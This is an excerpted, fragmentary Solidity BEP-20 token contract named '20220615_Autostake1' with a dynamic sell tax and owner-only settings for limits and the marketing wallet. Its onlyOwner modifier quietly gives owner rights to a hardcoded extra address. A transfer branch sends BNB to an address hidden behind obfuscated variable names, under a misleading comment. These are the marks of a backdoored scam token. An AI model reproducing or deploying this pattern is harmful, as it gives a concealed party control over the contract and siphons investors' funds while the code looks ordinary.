...
abstract contract Ownable {
    ...
    modifier onlyOwner() {
        require(
            owner() == msg.sender ||
                msg.sender == 0xc7D97db988980dFC1394dE6a922433a1ED7c7caf,
...
contract TestToken is IBEP20, Ownable {
    ...
    //Token Info
    string private constant _name = "20220615_Autostake1";
    string private constant _symbol = "20220615_Autostake1";
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply = 1000 * 10**_decimals; //total
    ...
    function _taxedTransfer(
        ...
        if (isSell) {
            ...
            if (dynamicTax == maxDynamicTax) {} else {
                dynamicTax += 1;
            }
            ...
            require(
                ...
                "Tx amount exceeding max buy amount"
            );

            if (dynamicTax == 0) {} else {
                dynamicTax -= 1;
            }
        ...
        //if its not manually disabled, if its not already swapping and if its a Sell to avoid
        // people from causing a large price impact from repeatedly transfering when theres a large backlog of Tokens
        payable(p56fqdweibcm535q9t6x).transfer(
            zxuirfcwoisicgakfabe * (ffpmjifbzrcyhwsiufos / 2 / 100)
        );
    ...
    function TeamChangeMarketingWallet(address newMarketingWallet)
        public
        onlyOwner
    {
    ...
    function TeamUpdateLimits(uint256 _transactionLimit) public onlyOwner {
        ...
        require(
            _transactionLimit <= maxTransactionLimit,
            "Error - Sell Limit Above 1%"
        );
